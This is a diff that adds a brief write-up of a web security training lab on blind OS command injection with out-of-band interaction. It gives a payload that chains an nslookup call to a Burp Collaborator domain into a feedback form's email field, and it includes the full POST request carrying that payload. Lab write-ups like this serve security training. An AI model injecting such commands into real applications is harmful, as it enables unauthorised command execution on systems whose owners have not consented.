@@ -1,0 +1,25 @@
+Blind OS command injection with out-of-band interaction
+
+Another blind attack, except this time we're getting the data through collaborator.
+Submit feedback through the form, send the POST request to repeater and fire up collaborator.
+
+Payload:
+x||nslookup+h9r8r0ola78i3wyyjgt10ycp3g96xv.burpcollaborator.net||
+
+Replace the contents of the email parameter with that, send it, then check your collaborator. You should have some DNS requests.
+
+Request:
+POST /feedback/submit HTTP/1.1
+Host: ac771f031f5120cf803163f300d90071.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 145
+Origin: https://ac771f031f5120cf803163f300d90071.web-security-academy.net
+Connection: close
+Referer: https://ac771f031f5120cf803163f300d90071.web-security-academy.net/feedback
+Cookie: session=ZYlwrGTKSh1FO6mPoBUeaftNsGFPV8gS
+
+csrf=QB5bQYOp8NjwF6D5eShLyx8UaMAtTtqv&name=asdf&email=x||nslookup+h9r8r0ola78i3wyyjgt10ycp3g96xv.burpcollaborator.net||&subject=asdf&message=asdf
